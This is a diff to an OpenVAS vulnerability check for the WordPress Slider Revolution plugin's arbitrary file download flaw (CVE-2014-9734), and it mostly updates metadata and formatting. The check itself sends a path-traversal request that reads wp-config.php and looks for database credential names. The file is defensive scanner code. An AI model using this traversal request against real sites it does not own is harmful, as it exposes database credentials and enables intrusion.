@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_slider_revolution_file_download_vuln.nasl 6505 2017-07-03 09:58:27Z teissa $
+# $Id: gb_wordpress_slider_revolution_file_download_vuln.nasl 11239 2018-09-05 09:46:45Z mmartin $
 #
 # Wordpress Revslider Arbitrary File Download Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805670");
-  script_version("$Revision: 6505 $");
+  script_version("$Revision: 11239 $");
   script_cve_id("CVE-2014-9734");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-03 11:58:27 +0200 (Mon, 03 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-05 11:46:45 +0200 (Wed, 05 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-07-10 15:54:40 +0530 (Fri, 10 Jul 2015)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Wordpress Revslider Arbitrary File Download Vulnerability");
@@ -57,15 +57,15 @@ if(description)
   script_tag(name:"affected", value:"Wordpress Slider Revolution (revslider)
   plugin before 4.2.");
 
-  script_tag(name: "solution" , value:"Upgrade to Wordpress Slider Revolution 4.2 or
+  script_tag(name:"solution", value:"Upgrade to Wordpress Slider Revolution 4.2 or
   later or apply patch form the link
   https://plugins.trac.wordpress.org/browser/patch-for-revolution-slider/trunk/revsliderpatch.php.
   For updates refer to http://revolution.themepunch.com/ ");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/132366/");
-  script_xref(name : "URL" , value : "http://marketblog.envato.com/news/plugin-vulnerability/");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/132366/");
+  script_xref(name:"URL", value:"http://marketblog.envato.com/news/plugin-vulnerability/");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -81,25 +81,16 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-# Construct GET Request
 url = dir + '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                    pattern:"(DB_USER|DB_PASSWORD|DB_NAME)"))
 {
